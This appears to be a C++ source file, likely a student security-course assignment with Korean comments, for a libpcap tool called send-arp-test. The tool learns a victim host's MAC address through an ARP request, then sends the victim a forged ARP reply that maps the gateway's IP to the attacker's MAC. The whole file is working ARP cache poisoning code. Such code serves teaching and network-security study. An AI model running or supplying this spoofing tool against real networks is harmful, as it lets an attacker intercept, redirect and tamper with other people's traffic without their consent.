#include "headers.h"

#define REQ_CNT 20

void myMac(char* mymac,char* dev); // 내 MAC 주소를 변수에 넣어주는 함수
void myIp(char* ip_buffer, char* iface_name); //내 ip받아오는 함수

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
char mac_adr[1024]= {0x00,}; //Attacker의 mac 주소 전역변수
char smac_adr[128] = {0x00,}; //sender의 mac 주소 전역변수
char my_Ip[128] = {0x00,};//myIp 전역변수
char senderMac[6] = {0x00,};//senderMac 전역변수
void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
    }
    myMac(mac_adr,argv[1]);
    myIp(my_Ip, argv[1]);

    printf("mymac:%s\n",mac_adr);
    printf("sIP:%s\n",argv[2]);
    printf("tIP:%s\n",argv[3]);
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    char errbuf_rq[PCAP_ERRBUF_SIZE];
    char errbuf_rp[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    pcap_t* handle_rq = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_rq);

    if (handle == nullptr || handle_rq == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
	}

	EthArpPacket packet;
    EthArpPacket packet_request;
    EthArpPacket packet_reply;

    /*
     * 만들고 싶은 packet_request 패킷 구성
     * ff ff ff ff ff ff  08 00 27 b4 91 a5 08 06 00 01 (request 이므로 op는 1)
     * 06 04 00 01 08 00  27 b4 91 a5 c0 a8 00 08 00 00 (ip 주소는 hex값으로)
     * 00 00 00 00 __ __  __ __ (이곳에 sender의 mac주소 hex값으로 받아오기)
     */

    packet_request.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //broadcast
    packet_request.eth_.smac_ = Mac(mac_adr); //Attacker의 mac 주소
    packet_request.eth_.type_ = htons(EthHdr::Arp); //arp type
    packet_request.arp_.hrd_ = htons(ArpHdr::ETHER); //H/W type : ethernet
    packet_request.arp_.pro_ = htons(EthHdr::Ip4); // protocol type
    packet_request.arp_.hln_ = Mac::SIZE; // H/W add length
    packet_request.arp_.pln_ = Ip::SIZE; //protocol length
    packet_request.arp_.op_ = htons(ArpHdr::Request);// 01
    packet_request.arp_.smac_ = Mac(mac_adr);//Attacker의 mac주소
    packet_request.arp_.sip_ = htonl(Ip(my_Ip)); //Attacker의 ip주소
    packet_request.arp_.tmac_ = Mac("00:00:00:00:00:00"); //sender의 mac주소
    packet_request.arp_.tip_ = htonl(Ip(argv[2])); //sender의 ip주소


    int res_rq = pcap_sendpacket(handle_rq, reinterpret_cast<const u_char*>(&packet_request), sizeof(EthArpPacket));
    if (res_rq != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_rq, pcap_geterr(handle_rq));
    }
    pcap_close(handle_rq);



    pcap_t* handle_rp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_rp);
       while(1){
           struct pcap_pkthdr* header;
           const u_char* packet;
           int res_rp = pcap_next_ex(handle, &header, &packet);
           if (res_rp == 0) continue;
           if (res_rp == -1 || res_rp == -2) exit(1);

           EthHdr* ethernet = (EthHdr*)packet;
           if(ethernet->type()!= EthHdr::Arp) continue;

           ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));
           if(arp->hrd() != ArpHdr::ETHER) continue;
           if(arp->pro() != EthHdr::Ip4) continue;
           if(arp->op() != ArpHdr::Reply) continue;
           if(arp->sip() == Ip(argv[2]) && arp->tip()==Ip(my_Ip) &&arp->tmac() == Mac(mac_adr)){
               uint8_t* tmpMac  = arp->smac();
               snprintf(senderMac,18,"%02x:%02x:%02x:%02x:%02x:%02x", tmpMac[0], tmpMac[1], tmpMac[2], tmpMac[3], tmpMac[4], tmpMac[5]);
               break;
           }
       }
       pcap_close(handle_rp);
       printf("senderMac : %s\n",senderMac);


    packet.eth_.dmac_ = Mac(senderMac); //Sender의 mac 주소
    packet.eth_.smac_ = Mac(mac_adr); //Attacker의 mac 주소
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);// 02
    packet.arp_.smac_ = Mac(mac_adr);//Attacker의 mac주소
    packet.arp_.sip_ = htonl(Ip(argv[3])); //gateway(target)의 ip주소
    packet.arp_.tmac_ = Mac(senderMac); //sender의 mac주소
    packet.arp_.tip_ = htonl(Ip(argv[2])); //sender의 ip주소

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    pcap_close(handle);

}


void myMac(char* mymac,char* dev) {
  int fd;
  struct ifreq ifr;
  char* mac;

  fd = socket(AF_INET, SOCK_DGRAM, 0);
  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFHWADDR, &ifr);
  close(fd);

  mac = (char*)ifr.ifr_hwaddr.sa_data;
  sprintf((char*)mymac, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x",
          mac[0] & 0xff, mac[1] & 0xff, mac[2] & 0xff, mac[3] & 0xff,
          mac[4] & 0xff, mac[5] & 0xff);
}

void myIp(char* ip_buffer, char* iface_name){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ -1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}
